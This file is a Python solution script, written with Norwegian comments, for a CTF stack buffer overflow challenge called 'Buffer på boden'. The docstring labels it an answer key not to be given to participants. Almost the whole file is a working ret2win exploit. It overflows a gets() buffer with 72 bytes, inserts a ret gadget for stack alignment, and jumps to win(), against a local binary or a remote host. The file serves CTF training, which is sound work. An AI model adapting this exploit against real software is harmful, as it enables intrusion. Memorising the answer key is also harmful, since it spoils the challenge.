"""
LØSNING — Buffer på boden (ikke gi til deltakerne!)

Klassisk ret2win:
  1. gets() leser ubegrenset inn i 64-byte buffer.
  2. Offset til saved RIP er 72 byte (64 buffer + 8 saved RBP).
  3. Overskriv saved RIP med &win() — men på amd64 må stack
     være 16-byte alignet før `call` inne i win() (printf), så
     vi legger inn én `ret`-gadget for å justere alignment.

Kjor mot lokal binær:
  python3 solve.py ./buffer
Kjor mot remote:
  python3 solve.py REMOTE host port
"""

import sys
import re
import socket
import struct
import subprocess
from pathlib import Path

# pwntools treats words like REMOTE as its own magic CLI flags and removes them
# from sys.argv during import. Preserve the user's intended solver arguments.
CLI_ARGS = sys.argv[1:].copy()

try:
    from pwn import ELF, p64, process, remote, context
except ImportError:
    ELF = None
    p64 = None
    process = None
    remote = None
    context = None

if context:
    context.arch = "amd64"
    context.log_level = "warn"


def exploit(io, elf):
    io.recvuntil(b"navn:")

    win_addr = elf.symbols["win"]
    ret_gadget = next(elf.search(b"\xc3"))

    # offset til saved RIP: 64 (buf) + 8 (saved RBP)
    payload = b"A" * 72 + p64(ret_gadget) + p64(win_addr)
    io.sendline(payload)

    out = io.recvall(timeout=5).decode(errors="replace")
    print("=== SERVER-RESPONS ===")
    print(out)
    print("=======================")

    import re
    m = re.search(r"CTF\{[^}\s]+\}", out)
    if m:
        print(f"\n*** FLAGG: {m.group(0)} ***")
    else:
        print("\n[-] Fant ikke flagget i output")


def read_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def recv_all(sock: socket.socket) -> bytes:
    data = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except TimeoutError:
            break
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def elf_symbol(binary: Path, symbol: str) -> int:
    data = binary.read_bytes()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("Forventet 64-bit little-endian ELF")

    e_shoff = struct.unpack_from("<Q", data, 40)[0]
    e_shentsize = struct.unpack_from("<H", data, 58)[0]
    e_shnum = struct.unpack_from("<H", data, 60)[0]

    sections = []
    for index in range(e_shnum):
        offset = e_shoff + index * e_shentsize
        sections.append(struct.unpack_from("<IIQQQQIIQQ", data, offset))

    for section in sections:
        _name, sh_type, _flags, _addr, sh_offset, sh_size, sh_link, _info, _align, sh_entsize = section
        if sh_type not in (2, 11) or sh_entsize == 0:
            continue
        strings = sections[sh_link]
        str_offset = strings[4]
        str_size = strings[5]
        strtab = data[str_offset:str_offset + str_size]

        for sym_offset in range(sh_offset, sh_offset + sh_size, sh_entsize):
            st_name, _info, _other, _shndx, st_value, _size = struct.unpack_from(
                "<IBBHQQ", data, sym_offset
            )
            end = strtab.find(b"\x00", st_name)
            name = strtab[st_name:end].decode("utf-8", errors="replace")
            if name == symbol:
                return st_value
    raise ValueError(f"Fant ikke symbol {symbol}")


def first_ret_gadget(binary: Path) -> int:
    data = binary.read_bytes()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("Forventet 64-bit little-endian ELF")

    e_phoff = struct.unpack_from("<Q", data, 32)[0]
    e_phentsize = struct.unpack_from("<H", data, 54)[0]
    e_phnum = struct.unpack_from("<H", data, 56)[0]

    for index in range(e_phnum):
        offset = e_phoff + index * e_phentsize
        p_type, p_flags, p_offset, p_vaddr, _p_paddr, p_filesz, _p_memsz, _p_align = struct.unpack_from(
            "<IIQQQQQQ", data, offset
        )
        if p_type != 1 or not (p_flags & 1):
            continue
        segment = data[p_offset:p_offset + p_filesz]
        ret_offset = segment.find(b"\xc3")
        if ret_offset != -1:
            return p_vaddr + ret_offset
    raise ValueError("Fant ikke ret-gadget")


def fallback_exploit_remote(host: str, port: int, binary: Path) -> None:
    win_addr = elf_symbol(binary, "win")
    ret_gadget = first_ret_gadget(binary)
    payload = b"A" * 72 + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr)

    with socket.create_connection((host, port), timeout=5) as sock:
        sock.settimeout(5)
        read_until(sock, b"navn:")
        sock.sendall(payload + b"\n")
        out = recv_all(sock).decode(errors="replace")

    print("=== SERVER-RESPONS ===")
    print(out)
    print("=======================")

    match = re.search(r"CTF\{[^}\s]+\}", out)
    if match:
        print(f"\n*** FLAGG: {match.group(0)} ***")
    else:
        print("\n[-] Fant ikke flagget i output")


def fallback_exploit_local(binary: Path) -> None:
    win_addr = elf_symbol(binary, "win")
    ret_gadget = first_ret_gadget(binary)
    payload = b"A" * 72 + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr)

    proc = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload + b"\n", timeout=5)
    text = out.decode(errors="replace")
    print("=== SERVER-RESPONS ===")
    print(text)
    print("=======================")

    match = re.search(r"CTF\{[^}\s]+\}", text)
    if match:
        print(f"\n*** FLAGG: {match.group(0)} ***")
    else:
        print("\n[-] Fant ikke flagget i output")


def main():
    if len(CLI_ARGS) >= 3 and CLI_ARGS[0].upper() == "REMOTE":
        host, port = CLI_ARGS[1], int(CLI_ARGS[2])
        binary = Path(__file__).parent.parent / "server" / "buffer"
        if ELF and remote:
            elf = ELF(str(binary))
            io = remote(host, port)
            exploit(io, elf)
        else:
            fallback_exploit_remote(host, port, binary)
    else:
        binary = CLI_ARGS[0] if CLI_ARGS else \
            str(Path(__file__).parent.parent / "server" / "buffer")
        if ELF and process:
            elf = ELF(binary)
            io = process(binary)
            exploit(io, elf)
        else:
            fallback_exploit_local(Path(binary))


if __name__ == "__main__":
    main()
